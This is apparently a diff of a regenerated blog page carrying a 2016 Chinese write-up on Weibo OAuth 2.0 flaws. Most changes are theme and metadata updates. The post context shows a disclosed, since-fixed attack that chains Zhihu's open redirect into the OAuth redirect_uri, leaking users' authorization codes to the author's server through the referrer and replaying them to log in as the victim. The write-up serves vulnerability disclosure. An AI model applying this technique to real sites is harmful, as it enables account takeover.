@@ -17,7 +17,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"zhchbin.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"zhchbin.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
   <meta name="description" content="前言这篇文章将介绍WEB网站在接入第三方账号系统：新浪微博进行用户身份验证登录时会遇到的几个问题。前段时间我在乌云上报了几个与这方面相关的漏洞，后面的内容会有实际的例子进行说明，不过存在的问题都已经得到修复。 新浪微博的OAuth 2.0接下来以开发者的角度来描述一下登录的过程。  用户通过浏览器访问Web网站并通过希望通过新浪微博进行登录，我们需要将其引导到以下的页面：https://api.w">
@@ -28,7 +28,7 @@
 <meta property="og:site_name" content="zhchbin">
 <meta property="og:description" content="前言这篇文章将介绍WEB网站在接入第三方账号系统：新浪微博进行用户身份验证登录时会遇到的几个问题。前段时间我在乌云上报了几个与这方面相关的漏洞，后面的内容会有实际的例子进行说明，不过存在的问题都已经得到修复。 新浪微博的OAuth 2.0接下来以开发者的角度来描述一下登录的过程。  用户通过浏览器访问Web网站并通过希望通过新浪微博进行登录，我们需要将其引导到以下的页面：https://api.w">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2016-10-02T05:43:40.000Z">
+<meta property="og:updated_time" content="2022-05-15T03:20:46.197Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="“脆弱”的微博OAuth 2.0">
 <meta name="twitter:description" content="前言这篇文章将介绍WEB网站在接入第三方账号系统：新浪微博进行用户身份验证登录时会遇到的几个问题。前段时间我在乌云上报了几个与这方面相关的漏洞，后面的内容会有实际的例子进行说明，不过存在的问题都已经得到修复。 新浪微博的OAuth 2.0接下来以开发者的角度来描述一下登录的过程。  用户通过浏览器访问Web网站并通过希望通过新浪微博进行登录，我们需要将其引导到以下的页面：https://api.w">
@@ -118,6 +118,16 @@
     <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
 
   </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
@@ -154,7 +164,7 @@
     <link itemprop="mainEntityOfPage" href="http://zhchbin.github.io/2016/02/16/The-Weakness-of-Weibo-OAuth2-0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.jpeg">
       <meta itemprop="name" content="Chaobin Zhang">
       <meta itemprop="description" content="">
     </span>
@@ -181,7 +191,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2016-10-02 13:43:40" itemprop="dateModified" datetime="2016-10-02T13:43:40+08:00">2016-10-02</time>
+                <time title="Modified: 2022-05-15 11:20:46" itemprop="dateModified" datetime="2022-05-15T11:20:46+08:00">2022-05-15</time>
               </span>
 
           
@@ -229,7 +239,8 @@
 </ol>
 <h3 id="0x02-用户授权code被盗"><a href="#0x02-用户授权code被盗" class="headerlink" title="0x02 用户授权code被盗"></a>0x02 用户授权code被盗</h3><p>先说一下效果，用户在微博点击我构造好的URL之后，我就可以骗到该用户的授权code，利用这个code我们就可以以用户的身份登录其授权过的某些网站。至于要怎么做到，后面我用知乎的例子来说明吧，目前也修复了。</p>
 <p>案例链接：<a href="http://wooyun.org/bugs/wooyun-2016-0174018" target="_blank" rel="noopener">微博上你点我链接我就上你绑定过的知乎账号</a>和<a href="http://wooyun.org/bugs/wooyun-2016-0175030" target="_blank" rel="noopener">微博上你点我链接我就上你绑定过的网易通行证（涉及考拉海购/BOBO/同城约会等）</a> </p>
-<p>在知乎上，页面中的URL链接都是使用了一个接口进行跳转的，例如我在知乎上不要脸地回答了一个问题的<a href="https://www.zhihu.com/question/37062603/answer/71139922" target="_blank" rel="noopener">答案</a>中 ，里面的URL都是类似这样子的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://link.zhihu.com/?target=http%3A//www.wooyun.org/whitehats/zhchbin</span><br></pre></td></tr></table></figure></p>
+<p>在知乎上，页面中的URL链接都是使用了一个接口进行跳转的，例如我在知乎上不要脸地回答了一个问题的<a href="https://www.zhihu.com/question/37062603/answer/71139922" target="_blank" rel="noopener">答案</a>中 ，里面的URL都是类似这样子的
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://link.zhihu.com/?target=http%3A//www.wooyun.org/whitehats/zhchbin</span><br></pre></td></tr></table></figure></p>
 <p>这个URL能够跳转到任意的网址，且不需要用户确认！我们可以利用这个问题来做什么的？接下来就看我一步步构造一个恶意的URL。上面的接口是HTTPS的，而我的网站只支持HTTP，为了从<code>referrer</code>偷到用户的code信息，所以我先试了一下http是否可以，发现是没问题的。课外知识：<a href="http://serverfault.com/questions/520244/referer-is-passed-from-https-to-http-in-some-cases-how" target="_blank" rel="noopener">关于https -&gt; http 跳转的referrer</a></p>
 <p>NEXT：知乎登录页面中的微博登录是跳转到如下的URL：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://api.weibo.com/oauth2/authorize?</span><br><span class="line">scope=email&amp;</span><br><span class="line">state=e9887b485320b0cab80b0d029e92759f&amp;</span><br><span class="line">redirect_uri=https%3A%2F%2Fwww.zhihu.com%2Foauth%2Fcallback%2Flogin%2Fsina&amp;</span><br><span class="line">response_type=code&amp;</span><br><span class="line">client_id=3063806388</span><br></pre></td></tr></table></figure>
@@ -237,7 +248,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://api.weibo.com/oauth2/authorize?</span><br><span class="line">scope=email&amp;</span><br><span class="line">state=e9887b485320b0cab80b0d029e92759f&amp;</span><br><span class="line">redirect_uri=http%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%3A%2F%2Fa.zhchbin.xyz%2Fauth%3F&amp;</span><br><span class="line">response_type=code&amp;</span><br><span class="line">client_id=3063806388</span><br></pre></td></tr></table></figure>
 <p>一个在授权过知乎的微博用户点击上面的URL后，新浪微博就会加上code参数并自动跳转到redirect_uri参数指定的URL。微博这样便利的默认行为，在这里帮了大忙。如果伪装的好，用户点了链接之后会根本就不知道发生了什么事情。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://link.zhihu.com/?target=http://a.zhchbin.xyz/auth?&amp;state=e9887b485320b0cab80b0d029e92759f&amp;code=776b93bbf6b2474067f593d743f36380</span><br></pre></td></tr></table></figure>
-<p>NEXT：上面的URL页面会使用JS调整到target参数中，这个时候我们查看一下auth接口的referrer，就可以找到用户的code，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[31/Jan/2016:15:28:31 +0800] &quot;GET /auth? HTTP/1.1&quot; 404 402 &quot;http://link.zhihu.com/?target=http://a.zhchbin.xyz/auth?&amp;state=e9887b485320b0cab80b0d029e92759f&amp;code=ad3d1b20385f891a36e498cb470146e5&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36&quot; &quot;2.94&quot;</span><br></pre></td></tr></table></figure></p>
+<p>NEXT：上面的URL页面会使用JS调整到target参数中，这个时候我们查看一下auth接口的referrer，就可以找到用户的code，例如：
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[31/Jan/2016:15:28:31 +0800] &quot;GET /auth? HTTP/1.1&quot; 404 402 &quot;http://link.zhihu.com/?target=http://a.zhchbin.xyz/auth?&amp;state=e9887b485320b0cab80b0d029e92759f&amp;code=ad3d1b20385f891a36e498cb470146e5&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36&quot; &quot;2.94&quot;</span><br></pre></td></tr></table></figure></p>
 <p>拿到这个code参数之后，在我们自己的浏览器中打开下面的链接，就可以以受害用户的身份来登录知乎了</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.zhihu.com/oauth/callback/login/sina?</span><br><span class="line">state=17324074ce785e6296061cf1381f6f8b&amp;</span><br><span class="line">code=ad3d1b20385f891a36e498cb470146e5</span><br></pre></td></tr></table></figure>
 <p>其中state参数的值是知乎首页的cookie中_xsrf对应的值。目前知乎已经修复这个问题，具体的修复方式就没有认真研究，我觉得最好的方式是在URL跳转前加一个安全提示，让用户确认的。</p>
@@ -339,12 +351,13 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#新浪微博的OAuth-2-0"><span class="nav-number">2.</span> <span class="nav-text">新浪微博的OAuth 2.0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#各种姿势"><span class="nav-number">3.</span> <span class="nav-text">各种姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-绑定接口的CSRF"><span class="nav-number">3.1.</span> <span class="nav-text">0x00 绑定接口的CSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-没有完整验证绑定流程"><span class="nav-number">3.2.</span> <span class="nav-text">0x01 没有完整验证绑定流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-用户授权code被盗"><span class="nav-number">3.3.</span> <span class="nav-text">0x02 用户授权code被盗</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Chaobin Zhang"
+      src="/images/avatar.jpeg">
   <p class="site-author-name" itemprop="name">Chaobin Zhang</p>
   <div class="site-description" itemprop="description"></div>
 </div>
@@ -353,7 +366,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -363,11 +376,20 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
+          
         <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
 </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zhchbin" title="GitHub → https://github.com/zhchbin" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://hackerone.com/zhchbin" title="Hackerone → https://hackerone.com/zhchbin" rel="noopener" target="_blank"><i class="fa fa-fw"></i>Hackerone</a>
+      </span>
+  </div>
 
 
 
